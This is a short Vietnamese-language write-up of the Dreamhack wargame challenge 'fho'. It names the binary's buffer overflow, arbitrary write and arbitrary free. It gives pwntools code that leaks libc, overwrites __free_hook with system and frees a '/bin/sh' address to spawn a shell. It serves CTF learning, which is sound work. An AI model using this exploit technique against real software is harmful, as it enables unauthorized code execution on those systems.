# Challenge Dreamhack
[*fho*](https://dreamhack.io/wargame/challenges/355)

# Phân tích code

<img width="766" height="538" alt="Screenshot 2026-11-10 165853" src="https://github.com/user-attachments/assets/450295a2-cc7e-41c4-bdea-139ccfb1013e" />

## Các lỗ hổng có thể khai thác

- Buffer overflow
- Nhập địa chỉ và gán giá trị vào địa chỉ đó
- free bất kì địa chỉ nào nhập vào

## Mitigation

<img width="725" height="233" alt="image" src="https://github.com/user-attachments/assets/ef350b98-277b-4265-a5ce-776bc0fa9e48" />

Vì chương trình có Canary nên với 1 lần nhập vào Stack là không đủ để ghi đè return address.
<br>

<img width="722" height="64" alt="image" src="https://github.com/user-attachments/assets/272bbb12-4628-4a76-9525-2113d68bc079" />

Trong chương trình tồn tại các hook. Để khai thác thì đầu tiên cần leak libc.

Leak libc:

    p.sendlineafter(b'Buf: ',b'A'*0x48)
    p.recvuntil(b'A'*0x48)
    libc.leak=u64(p.recv(6)+b'\x00\x00')
    libc.address=libc.leak-0x21b0a
    
## gọi system (cách 1)
Khi đã có libc base thì ghi đè `system` vào `__free_hook`. Đồng thời gửi vào lệnh free 1 địa chỉ có chứa chuỗi `/bin/sh\0 ` để làm tham số cho `system`.

Gọi system:

    p.sendlineafter(b'To write: ',str(libc.sym['__free_hook']).encode())
    p.sendlineafter(b'With: ',str(libc.sym['system']).encode())
    p.sendlineafter(b'To free: ',str(next(libc.search(b'/bin/sh'))).encode())

## gọi one_gadget (cách 2)
<img width="866" height="392" alt="image" src="https://github.com/user-attachments/assets/8f3de339-bcd8-4909-b1cf-a2907b091967" />

